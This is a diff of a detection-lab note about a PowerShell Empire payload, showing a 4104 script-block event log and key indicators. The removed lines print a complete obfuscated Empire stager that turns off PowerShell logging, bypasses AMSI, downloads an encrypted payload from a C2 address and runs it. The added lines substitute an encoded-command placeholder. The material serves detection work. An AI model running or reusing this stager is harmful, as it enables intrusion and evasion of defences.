@@ -49,28 +49,31 @@ This is the example to study the behavior of the empire generated payload
 | dest_ip      | 192.168.254.46 | my test lab c2                                                     |
 | dest_port    | 80             | depends on the empire listener type, in this simulation i set http |
 
-
-
-
 ##### Raw Powershell Event
 ```xml
 12/09/2020 06:41:32 PM
 LogName=Microsoft-Windows-PowerShell/Operational
 EventCode=4104
-EventType=3
+EventType=5
 ComputerName=DESKTOP-DS6SIME
 User=NOT_TRANSLATED
 Sid=S-1-5-21-2242309504-3943410855-4141223597-1003
 SidType=0
 SourceName=Microsoft-Windows-PowerShell
-Type=Warning
-RecordNumber=152
+Type=Verbose
+RecordNumber=148
 Keywords=None
 TaskCategory=Execute a Remote Command
 OpCode=On create calls
 Message=Creating Scriptblock text (1 of 1):
-If($PSVERSIONTaBLE.PSVersioN.Major -Ge 3){$6866=[rEF].AsSEmBlY.GeTTYPE('System.Management.Automation.Utils')."GETFIE`lD"('cachedGroupPolicySettings','N'+'onPublic,Static');IF($6866){$1fE7=$6866.GeTVALue($NulL);If($1fe7['ScriptB'+'lockLogging']){$1FE7['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$1Fe7['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$VAl=[COlLeCtionS.GeNerIc.DicTioNArY[StRINg,SystEm.OBjeCt]]::nEw();$vaL.Add('EnableScriptB'+'lockLogging',0);$Val.ADd('EnableScriptBlockInvocationLogging',0);$1fE7['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAL}ELSe{[SCrIPtBLoCK]."GEtFIe`ld"('signatures','N'+'onPublic,Static').SetValUe($null,(NeW-ObJect ColLeCTIonS.GENeric.HAsHSEt[String]))}$REF=[REF].ASsEMBLy.GEtTyPe('System.Management.Automation.Amsi'+'Utils');$REF.GETFIeLd('amsiInitF'+'ailed','NonPublic,Static').SetVAluE($null,$trUE);};[SySTEm.NeT.SErvIcePOINTManAGeR]::EXpeCT100ConTINUe=0;$f94E=NEw-ObJEct SYStEm.NEt.WEbClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([TEXT.EncODiNg]::UNiCoDe.GETStrINg([COnVert]::FrOMBAse64StRING('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgA1ADQALgA0ADYAOgA4ADAA')));$t='/news.php';$f94E.HEaDERs.ADD('User-Agent',$u);$F94E.PrOXY=[SYSTEM.NEt.WEbReQuest]::DeFAulTWebPRoxy;$f94e.PRoXy.CreDenTiALS = [SystEM.NEt.CrEDEnTiaLCachE]::DEFaulTNEtWORKCrEdeNTIAlS;$Script:Proxy = $f94e.Proxy;$K=[SysteM.TExT.ENcOdING]::ASCII.GEtBYTES('d6ca3fd0c3a3b462ff2b83436dda495e');$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$f94e.HeADErs.ADD("Cookie","fWJXtlJxNLEeuCyR=RVMR/WTf/10e5AuqgunI/tSzYc8=");$DATA=$F94E.DowNlOAdDatA($SEr+$t);$IV=$DATA[0..3];$DATa=$dATA[4..$Data.lenGTH];-jOiN[CHAr[]](& $R $Data ($IV+$K))|IEX
+powershell -noP -sta -w 1 -enc  //5096 bytes payload//
 
-ScriptBlock ID: 4730dd1c-d170-4282-895d-5fc273487e82
+ScriptBlock ID: 849c7b04-3d0b-4510-beb0-12f222a5ef3c
 Path:
 ```
+
+##### Key Indicator 
+| Field   | Value                                                                                                                                                | Comments |
+| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
+| EventID | 4104                                                                                                                                                 |          |
+| Message | Creating Scriptblock text (1 of 1): powershell -noP -sta -w 1 -enc //5096 bytes payload// ScriptBlock ID: 849c7b04-3d0b-4510-beb0-12f222a5ef3c Path: |
